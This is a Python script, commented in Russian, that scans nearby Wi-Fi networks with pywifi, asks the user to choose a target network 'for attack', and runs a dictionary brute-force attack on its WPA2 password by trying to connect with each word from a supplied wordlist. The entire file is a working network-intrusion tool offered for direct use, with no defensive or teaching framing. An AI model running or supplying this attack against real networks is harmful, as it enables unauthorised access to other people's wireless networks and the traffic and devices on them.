#!/usr/bin/env python3
import pywifi
from pywifi import const
import time
import sys

def scan_networks(interface):
    """Сканирование доступных сетей"""
    interface.scan()
    for i in range(5):
        time.sleep(1)
        print(f"Сканирование... {i+1}/5")
    return interface.scan_results()

def connect_to_network(interface, ssid, password):
    """Подключение к сети с указанным паролем"""
    profile = pywifi.Profile()
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP
    profile.key = password
    
    interface.remove_all_network_profiles()
    temp_profile = interface.add_network_profile(profile)
    
    interface.connect(temp_profile)
    time.sleep(3)  # Время на подключение
    
    if interface.status() == const.IFACE_CONNECTED:
        print(f"Успешное подключение к {ssid} с паролем: {password}")
        return True
    else:
        print(f"Не удалось подключиться с паролем: {password}")
        interface.disconnect()
        return False

def brute_force_wifi(interface, ssid, wordlist_path):
    """Брутфорс-атата на сеть"""
    try:
        with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as file:
            passwords = [line.strip() for line in file]
    except FileNotFoundError:
        print(f"Файл словаря {wordlist_path} не найден")
        return False
    
    print(f"Начинаю брутфорс-атаку на сеть {ssid}")
    print(f"В словаре {len(passwords)} паролей")
    
    for password in passwords:
        if connect_to_network(interface, ssid, password):
            return password
    
    print("Пароль не найден в словаре")
    return None

if __name__ == "__main__":
    # Проверка наличия модуля pywifi
    try:
        import pywifi
    except ImportError:
        print("Модуль pywifi не установлен. Установите его командой: pip install pywifi")
        sys.exit(1)
    
    # Инициализация Wi-Fi интерфейса
    wifi = pywifi.PyWiFi()
    interface = wifi.interfaces()[0]  # Используем первый Wi-Fi адаптер
    
    # Сканирование сетей
    networks = scan_networks(interface)
    
    # Вывод доступных сетей
    print("Доступные сети:")
    for i, network in enumerate(networks):
        print(f"{i+1}. SSID: {network.ssid}, Сигнал: {network.signal}")
    
    # Выбор сети для атаки
    try:
        choice = int(input("Выберите номер сети для атаки: ")) - 1
        if choice < 0 or choice >= len(networks):
            print("Неверный выбор")
            sys.exit(1)
    except ValueError:
        print("Введите число")
        sys.exit(1)
    
    target_network = networks[choice]
    wordlist_path = input("Введите путь к файлу словаря: ")
    
    # Запуск брутфорс-атаки
    password = brute_force_wifi(interface, target_network.ssid, wordlist_path)
    
    if password:
        print(f"Пароль для сети {target_network.ssid}: {password}")
    else:
        print("Не удалось найти пароль")